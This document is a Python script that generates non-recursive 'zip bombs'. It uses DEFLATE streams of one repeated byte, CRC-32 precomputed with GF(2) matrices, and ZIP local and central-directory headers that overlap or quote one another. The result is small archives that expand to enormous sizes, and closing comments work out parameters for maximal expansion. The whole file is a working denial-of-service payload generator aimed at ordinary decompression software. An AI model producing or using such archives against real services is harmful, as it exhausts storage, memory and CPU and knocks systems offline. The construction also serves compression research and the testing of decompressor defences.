#!/usr/bin/env python3

import binascii
import math
import struct
import sys


CHOSEN_BYTE = ord(b"A") # homage to 42.zip


# CRC-32 precomputation using matrices in GF(2). Similar to crc32_combine in
# zlib. See https://stackoverflow.com/a/23126768 for a description of the idea.
# Here, we use a 33-bit state where the dummy 33rd coordinate is always 1
# (similar to homogeneous coordinates). Matrices are represented as 33-element
# lists, where each element is a 33-bit integer representing one column.

CRC_POLY = 0xedb88320

def matrix_mul_vector(m, v):
    r = 0
    for shift in range(len(m)):
        if (v>>shift) & 1 == 1:
            r ^= m[shift]
    return r

def matrix_mul(a, b):
    assert len(a) == len(b)
    return [matrix_mul_vector(a, v) for v in b]

def identity_matrix():
    return [1<<shift for shift in range(33)]

# Matrix that updates CRC-32 state for a 0 bit.
CRC_M0 = [CRC_POLY] + [1<<shift for shift in range(31)] + [1<<32]
# Matrix that flips the LSb (x^31 in the polynomial).
CRC_MFLIP = [1<<shift for shift in range(32)] + [(1<<32) + 1]
# Matrix that updates CRC-32 state for a 1 bit: flip the LSb, then act as for a 0 bit.
CRC_M1 = matrix_mul(CRC_M0, CRC_MFLIP)

def precompute_crc_matrix(data):
    m = identity_matrix()
    for b in data:
        for shift in range(8):
            m = matrix_mul([CRC_M0, CRC_M1][(b>>shift)&1], m)
    return m

def precompute_crc_matrix_repeated(data, n):
    accum = precompute_crc_matrix(data)
    # Square-and-multiply algorithm to compute m = accum^n.
    m = identity_matrix()
    while n > 0:
        if n & 1 == 1:
            m = matrix_mul(m, accum)
        accum = matrix_mul(accum, accum)
        n >>= 1
    return m

def crc_matrix_apply(m, value=0):
    return (matrix_mul_vector(m, (value^0xffffffff)|(1<<32)) & 0xffffffff) ^ 0xffffffff


# DEFLATE stuff, see RFC 1951.

class BitBuffer:
    def __init__(self):
        self.done = []
        self.current = 0
        self.bit_pos = 0

    def push(self, x, n):
        assert x == x % (1<<n), (bin(x), n)
        while n >= (8 - self.bit_pos):
            self.current |= (x << self.bit_pos) & 0xff
            x >>= (8 - self.bit_pos)
            n -= (8 - self.bit_pos)
            self.done.append(self.current)
            self.current = 0
            self.bit_pos = 0
        self.current |= (x << self.bit_pos) & 0xff
        self.bit_pos += n

    def push_rev(self, x, n):
        mask = (1<<n)>>1
        while mask > 0:
            self.push(x&mask != 0 and 1 or 0, 1)
            mask >>= 1

    def bytes(self):
        out = bytes(self.done)
        if self.bit_pos != 0:
            out += bytes([self.current])
        return out

# RFC 1951 section 3.2.2. Input is a sym: length dict and output is a
# sym: (code, length) dict.
def huffman_codes_from_lengths(sym_lengths):
    bl_count = {}
    max_length = 0
    for _, length in sym_lengths.items():
        bl_count.setdefault(length, 0)
        bl_count[length] += 1
        max_length = max(max_length, length)

    next_code = {}
    code = 0
    for length in range(max_length):
        code = (code + bl_count.get(length, 0)) << 1
        next_code[length+1] = code

    result = {}
    for sym, length in sorted(sym_lengths.items(), key=lambda x: (x[1], x[0])):
        assert next_code[length] >> length == 0, (sym, bin(next_code[length]), length)
        result[sym] = next_code[length], length
        next_code[length] += 1
    return result

def print_huffman_codes(sym_codes, **kwargs):
    max_sym_length = max(len("{}".format(sym)) for sym in sym_codes)
    for sym, code in sorted(sym_codes.items()):
        code, length = code
        print("{:{}}: {:0{}b}".format(sym, max_sym_length, code, length), **kwargs)

# RFC 1951 section 3.2.5. Returns a tuple (code, extra_bits, num_extra_bits).
def code_for_length(length):
    if length < 3:
        return None, None, None
    elif length < 11:
        base_code, base_length, num_bits = 257, 3, 0
    elif length < 19:
        base_code, base_length, num_bits = 265, 11, 1
    elif length < 35:
        base_code, base_length, num_bits = 269, 19, 2
    elif length < 67:
        base_code, base_length, num_bits = 273, 35, 3
    elif length < 131:
        base_code, base_length, num_bits = 277, 67, 4
    elif length < 258:
        base_code, base_length, num_bits = 281, 131, 5
    else:
        raise ValueError(length)
    return base_code + ((length - base_length) >> num_bits), (length - base_length) & ((1<<num_bits)-1), num_bits

# DEFLATE a string of a single repeated byte. Runs in two modes, depending on
# whether you provide compressed_size or uncompressed_size.
# compressed_size: decompresses to as many bytes as possible given an overall
# compressed length.
# uncompressed_size: decompresses to exactly that many bytes.
# Returns a tuple (compressed_data, uncompressed_size, crc_matrix).
def bulk_deflate(repeated_byte, compressed_size=None, uncompressed_size=None, final=1):
    assert (compressed_size is None and uncompressed_size is not None) or (compressed_size is not None and uncompressed_size is None)

    if uncompressed_size is not None:
        # Find a code for the number of bytes remaining after bulk compression of
        # 258 bytes at a time. Subtract 1 because we must output a single literal
        # byte.
        excess = (uncompressed_size - 1) % 258
        excess_code, excess_bits, excess_num_bits = code_for_length(excess)

    # Huffman tree for code lengths.
    code_length_lengths = {
         0: 2,
         1: 3,
         2: 3,
        18: 1,
    }
    if uncompressed_size is not None and excess_code is not None:
        code_length_lengths[0] = 3
        code_length_lengths[3] = 3
    code_length_codes = huffman_codes_from_lengths(code_length_lengths)
    # print_huffman_codes(code_length_codes, file=sys.stderr)

    # Huffman tree for literal/length values.
    ll_lengths = {
        repeated_byte: 2, # literal byte
                  256: 2, # end of stream
                  285: 1, # copy 285 bytes
    }
    if uncompressed_size is not None and excess_code is not None:
        ll_lengths[256] = 3
        ll_lengths[excess_code] = 3
    ll_codes = huffman_codes_from_lengths(ll_lengths)
    # print_huffman_codes(ll_codes, file=sys.stderr)

    # Huffman tree for distance codes.
    distance_lengths = {
        0: 1,   # distance 1
    }
    distance_codes = huffman_codes_from_lengths(distance_lengths)
    # print_huffman_codes(distance_codes, file=sys.stderr)

    bits = BitBuffer()
    # BFINAL
    bits.push(0b1, final and 1 or 0)
    # BTYPE=10: dynamic Huffman codes
    bits.push(0b10, 2)
    # HLIT is 257 less than the number of literal/length codes
    bits.push(max(ll_lengths) + 1 - 257, 5)
    # HDIST is 1 less than the number of distance codes
    bits.push(max(distance_lengths) + 1 - 1, 5)
    # HCLEN is 4 less than the number of code length codes
    CODE_LENGTH_ALPHABET = (16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15)
    num_code_length_codes = max(CODE_LENGTH_ALPHABET.index(sym) for sym in code_length_lengths) + 1
    bits.push(num_code_length_codes - 4, 4)

    # Output Huffman tree for code lengths.
    for code_length in CODE_LENGTH_ALPHABET[:num_code_length_codes]:
        bits.push(code_length_lengths.get(code_length, 0), 3)

    # Skip n literal/length slots. Assumes we have length codes for 0 and 18.
    def skip(n):
        while n >= 11:
            if n < 138:
                x = n
            elif n < 138 + 11 and code_length_lengths[18] < (n - 138) * code_length_lengths[0]:
                # It'll be cheaper to cut this 18 block short and do the
                # remainder with another full 18 block.
                x = n - 11
            else:
                x = 138
            bits.push_rev(*code_length_codes[18]) # 7 bits of length to follow
            bits.push(x - 11, 7)
            n -= x
        while n > 0:
            bits.push_rev(*code_length_codes[0])
            n -= 1
    # Output a Huffman tree in terms of code lengths.
    def output_code_length_tree(sym_lengths):
        cur = 0
        for sym, length in sorted(sym_lengths.items()):
            skip(sym - cur)
            bits.push_rev(*code_length_codes[length])
            cur = sym + 1

    # Output Huffman tree for literal/length values.
    output_code_length_tree(ll_lengths)

    # Output Huffman tree for distance codes.
    output_code_length_tree(distance_lengths)

    n = 0
    # A literal byte to start the whole process.
    bits.push_rev(*ll_codes[repeated_byte])
    n += 1

    if uncompressed_size is not None:
        # We need to be precise about the number of bytes that remain after bulk
        # compression.
        if excess_code is not None:
            bits.push_rev(*ll_codes[excess_code])
            bits.push(excess_bits, excess_num_bits)
            bits.push(*distance_codes[0])
            n += excess
        else:
            for _ in range(excess):
                bits.push_rev(*ll_codes[repeated_byte])
                n += 1
        assert (uncompressed_size - n) % 258 == 0, (n, uncompressed_size)

    # Now every pair of 0 bits encodes 258 copies of repeated_byte.
    is_even = bits.bit_pos % 2 == 0
    # Including whatever zero bits remain at the end of the bit buffer.
    n += (8 - bits.bit_pos + 1) // 2 * 258

    prefix = bits.bytes()

    bits = BitBuffer()
    if not is_even:
        bits.push(*distance_codes[0])
    if uncompressed_size is not None:
        # Push enough bytes to leave the body as a multiple of 1032.
        assert (uncompressed_size - n) % 258 == 0, (n, uncompressed_size)
        while (uncompressed_size - n) % 1032 != 0:
            bits.push_rev(*ll_codes[285])
            bits.push(*distance_codes[0])
            n += 258
    else:
        # Push the stream-end code as far back in the byte as possible.
        while bits.bit_pos + ll_lengths[repeated_byte] + distance_lengths[0] + ll_lengths[256] <= 8:
            bits.push_rev(*ll_codes[285])
            bits.push(*distance_codes[0])
            n += 258
    bits.push_rev(*ll_codes[256])
    suffix = bits.bytes()

    if uncompressed_size is not None:
        num_zeroes = (uncompressed_size - n) // 1032
    else:
        num_zeroes = compressed_size - len(prefix) - len(suffix)

    n += num_zeroes * 1032
    body = b"\x00" * num_zeroes

    compressed_data = prefix + body + suffix

    if uncompressed_size is not None:
        assert n == uncompressed_size, (n, uncompressed_size)
    else:
        assert len(compressed_data) == compressed_size, (len(compressed_data), compressed_size)

    return compressed_data, n, precompute_crc_matrix_repeated(bytes([repeated_byte]), n)


# APPNOTE.TXT 4.4.5
# 8 - The file is Deflated
COMPRESSION_METHOD_DEFLATE = 8

MOD_DATE = 0x0548
MOD_TIME = 0x6ca0

class LocalFileHeader:
    def __init__(self, compressed_size, uncompressed_size, crc, filename, extra_length):
        self.compressed_size = compressed_size
        self.uncompressed_size = uncompressed_size
        self.crc = crc
        self.filename = filename
        self.extra_length = extra_length

    def serialize(self):
        # APPNOTE.TXT 4.3.7
        return struct.pack("<LHHHHHLLLHH",
            0x04034b50, # signature
            20,         # zip version 2.0
            0,          # flags
            COMPRESSION_METHOD_DEFLATE, # compression method
            MOD_TIME,   # modification time
            MOD_DATE,   # modification date
            self.crc,   # CRC-32
            self.compressed_size,   # compressed size
            self.uncompressed_size, # uncompressed size
            len(self.filename),     # filename length
            self.extra_length,      # extra length
        ) + self.filename

class CentralDirectoryHeader:
    # template is a LocalFileHeader instance.
    def __init__(self, local_file_header_offset, template):
        self.local_file_header_offset = local_file_header_offset
        self.compressed_size = template.compressed_size
        self.uncompressed_size = template.uncompressed_size
        self.crc = template.crc
        self.filename = template.filename
        self.extra_length = template.extra_length

    def serialize(self):
        # APPNOTE.TXT 4.3.12
        return struct.pack("<LHHHHHHLLLHHHHHLL",
            0x02014b50, # signature
            20,         # version made by
            0,          # version needed to extract
            0,          # flags
            COMPRESSION_METHOD_DEFLATE, # compression method
            MOD_TIME,   # modification time
            MOD_DATE,   # modification date
            self.crc,   # CRC-32
            self.compressed_size,   # compressed size
            self.uncompressed_size, # uncompressed size
            len(self.filename),     # filename length
            self.extra_length,      # extra length
            0,          # file comment length
            0,          # disk number where file starts
            0,          # internal file attributes
            0,          # external file attributes
            self.local_file_header_offset,  # offset of local file header
        ) + self.filename + (struct.pack("<HH", 0x000d, max(0, self.extra_length - 4))+b"\x00"*65535)[:self.extra_length]

class EndOfCentralDirectory:
    def __init__(self, cd_num_entries, cd_size, cd_offset):
        self.cd_num_entries = cd_num_entries
        self.cd_size = cd_size
        self.cd_offset = cd_offset

    def serialize(self):
        # APPNOTE.TXT 4.3.16
        return struct.pack("<LHHHHLLH",
            0x06054b50, # signature
            0,          # number of this disk
            0,          # disk of central directory
            self.cd_num_entries,    # number of central directory entries on this disk
            self.cd_num_entries,    # number of central directory entries total
            self.cd_size,   # size of central directory
            self.cd_offset, # offset of central directory
            0,          # comment length
        )


FILENAME_LETTERS = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
def filename_for_index(i):
    letters = []
    while True:
        letters.insert(0, FILENAME_LETTERS[i % len(FILENAME_LETTERS)])
        i = i // len(FILENAME_LETTERS) - 1
        if i < 0:
            break
    return bytes(letters)

# Closed-form formula for the sum of the first n filenames generated by
# filename_for_index.
#
# First, pretend like filename_for_index generates a zero-length filename at
# index 0, and shift the other indices by 1. This doesn't affect the sum of
# lengths, and makes the formula more regular. Now, of the first n filenames,
# all but 1 are at least 1 byte long, all but 36+1 are at least 2 bytes long,
# all but 36²+36+1 are at least 3 bytes long, and so on. In general, for a
# length i, all but 36^(i-1)+...+1 = (36^i-1)/35 (a base-36 repunit) filenames
# are at least i bytes long. The greatest value of i that does not exceed the
# length of the nth filename is
#   d = floor(log_10(n/(36/35)))
# For each value of i, we add 1 byte for each filename that is at least i bytes
# long.
#   Σ_i=0…d n - (36^i-1)/35
#   = dn - Σ_i=0…d (36^i-1)/35
#   = dn - ((36^d-1)*36/35² - d/35)
# where the last equality comes from adapting a formula for the sum of base-10
# repunits: https://oeis.org/A014824.
def sum_filename_lengths(n):
    n += 1 # Shift by 1 index for a fictitious zero-length filename.
    b = float(len(FILENAME_LETTERS))
    b1 = b - 1.0
    # Length of the longest base-b repunit not greater than n
    d = math.floor(math.log(n/(b/b1), b)) + 1
    return int(d*n - ((b**d-1) * b/b1 - d)/b1)

def write_zip_full_reuse(f, num_copies, compressed_size=None, uncompressed_size=None):
    compressed_data, n, crc_matrix = bulk_deflate(CHOSEN_BYTE, compressed_size=compressed_size, uncompressed_size=uncompressed_size)

    main_crc = crc_matrix_apply(crc_matrix)
    main_file = LocalFileHeader(len(compressed_data), n, main_crc, filename_for_index(0), 0)

    offset = 0
    main_file_offset = offset
    offset += f.write(main_file.serialize())
    offset += f.write(compressed_data)

    cd_offset = offset
    for i in range(num_copies):
        cd_header = CentralDirectoryHeader(main_file_offset, main_file)
        cd_header.filename = filename_for_index(i)
        offset += f.write(cd_header.serialize())
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(num_copies, cd_size, cd_offset).serialize())

    return offset

def write_zip_quoted_reuse(f, num_additional, compressed_size=None, uncompressed_size=None):
    class FileRecord:
        def __init__(self, header, data):
            self.header = header
            self.data = data

    # We build the file table backwards on a stack, starting with the file that
    # actually contains the bulk of the compressed data.
    files = []
    compressed_data, n, crc_matrix = bulk_deflate(CHOSEN_BYTE, compressed_size=compressed_size, uncompressed_size=uncompressed_size)
    header = LocalFileHeader(len(compressed_data), n, crc_matrix_apply(crc_matrix), filename_for_index(num_additional), 0)
    files.append(FileRecord(header, compressed_data))

    crc_matrix = precompute_crc_matrix_repeated(b"\x00", n)

    for i in range(num_additional):
        # The file that will follow this one is the one that has most recently
        # been added to the stack.
        next_file = files[-1]
        next_header_bytes = next_file.header.serialize()

        if len(next_header_bytes) + next_file.header.extra_length + next_file.header.uncompressed_size <= 0xffffffff:
            # We have room to quote the following Local File Header.
            assert next_file.header.extra_length == 0, next_file.header.extra_length

            # Here we do a crc32_combine operation to compute the CRC of
            # prefix+remainder, knowing crc32(prefix), crc32(remainder), and a
            # matrix that computes the effect of len(remainder) 0x00 bytes.
            # Basically it's the xor of crc32(remainder) and crc32(prefix + zeroes),
            # where the latter quantity is the result of applying the matrix to
            # crc32(prefix).
            crc1 = binascii.crc32(next_header_bytes)
            crc2 = next_file.header.crc
            # Undo the pre- and post-conditioning that crc_matrix_apply does,
            # because crc1 and crc2 are already conditioned.
            new_crc = crc_matrix_apply(crc_matrix, crc1 ^ 0xffffffff) ^ 0xffffffff ^ crc2
            # Next file will have an additional len(next_header_bytes) accumulated
            # into crc_matrix.
            crc_matrix = matrix_mul(crc_matrix, precompute_crc_matrix_repeated(b"\x00", len(next_header_bytes)))

            # Place a non-final non-compressed DEFLATE block (BFINAL=0, BTYPE=00)
            # that quotes the following Local File Header and joins up with the
            # DEFLATE stream that it contains.
            quote = struct.pack("<BHH", 0x00, len(next_header_bytes), len(next_header_bytes) ^ 0xffff)
            header = LocalFileHeader(
                len(quote) + len(next_header_bytes) + next_file.header.extra_length + next_file.header.compressed_size,
                len(next_header_bytes) + next_file.header.extra_length + next_file.header.uncompressed_size,
                new_crc,
                filename_for_index(num_additional - i - 1),
                0,
            )
        else:
            # This file has no room to grow; instead, quote the following Local
            # File Header inside this one's "extra" field. This file will have
            # the same size as the following one.
            quote = struct.pack("<HH", 0x000d, len(next_header_bytes) + next_file.header.extra_length - 4)
            header = LocalFileHeader(
                next_file.header.compressed_size,
                next_file.header.uncompressed_size,
                next_file.header.crc,
                filename_for_index(num_additional - i - 1),
                len(quote) + len(next_header_bytes) + next_file.header.extra_length,
            )
        files.append(FileRecord(header, quote))

    central_directory = []
    offset = 0
    while files:
        record = files.pop()
        central_directory.append(CentralDirectoryHeader(offset, record.header))
        offset += f.write(record.header.serialize())
        offset += f.write(record.data)

    cd_offset = offset
    for cd_header in central_directory:
        offset += f.write(cd_header.serialize())
    cd_size = offset - cd_offset

    offset += f.write(EndOfCentralDirectory(len(central_directory), cd_size, cd_offset).serialize())

    return offset


# write_zip_full_reuse(sys.stdout.buffer, 442, compressed_size=21125+16)
# write_zip_quoted_reuse(sys.stdout.buffer, 250, compressed_size=21094)

# (1<<32) - 1 is the maximum representable file size.
# 30*65534 is the file size increase from quoting 65534 Local File Headers.
# sum_filename_lengths(65534) - sum_filename_lengths(1) is the file size
# increase from quoting all but the first filename.
# write_zip_quoted_reuse(sys.stdout.buffer, 65534, uncompressed_size=(1<<32) - 1 - (30*65534 + sum_filename_lengths(65535) - sum_filename_lengths(1)))

# S compressed file data
# N * 30 Local File Headers
# N * 46 Central Directory Headers
# N * 2 * ~2 filenames
# (N-1) * 5 quotes
# 16 bytes DEFLATE overhead (represents 1033 bytes itself)
#
# maximize (1033 + (S - 16) * 1032) * N + 32 * (N - 1)
# subject to
#   16 + S + N * (30 + 46 + 4) + (N-1)*5 + 22 <= 42374
#
# max (33 + (S - 15) * 1032) * N - 32
#     (1032*S - 15447) * N
#     (1032*(42331 - 85*N) - 15447) * N
#     43670115*N - 87720*N*N
#     => max integer N at N=250 => S=21081
#
#   S = 42331 - 85*N
#   N = (42331 - S)/85
